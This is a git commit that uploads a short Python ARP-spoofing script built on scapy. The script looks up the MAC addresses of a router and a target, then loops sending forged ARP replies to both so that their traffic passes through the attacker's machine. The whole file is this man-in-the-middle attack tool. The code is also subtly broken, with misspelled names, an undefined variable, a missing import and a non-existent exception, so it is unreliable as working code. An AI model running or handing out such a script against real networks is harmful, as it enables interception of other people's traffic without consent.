3354f651dd9ce7f65c8e1f98b119feb63f8c772c
bonnie <55579065+bonnie-bg@users.noreply.github.com>
2022-04-11 18:16:10 +0000

    Add files via upload

---
+++ arpspoofer.py
@@ -0,0 +1,33 @@
+import scapy.all as scapy
+
+import sys
+
+
+def get_mac_address(ip_address):
+    broadcast_layer = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_layer = scapy.ARP(dst=ip_address)
+    get_mac_packet = broadcast_layer / arp_layer
+    aswer = scapy.srp(get_mac_packet, timeout=2, varbose=False)[0]
+    return aswer[0][1].hwsrc
+
+
+def spoof(router_ip, target_ip, router_mac, target_mac):
+    packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
+    packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
+    scapy.send(packet1)
+    scapy.send(packet2)
+
+
+target_ip = str(sys.argv[2])
+router_ip = str(sys.argv[1])
+terget_mac = str(get_mac_address(target_ip))
+router_mac = str(get_mac_address(router_ip))
+
+
+try:
+    while True:
+        spoof(router_ip, target_ip, router_mac, target_mac)
+        time.sleep(2)
+except KeyboardInter:
+    print("closing ARP Spoofer")
+    exit(0)
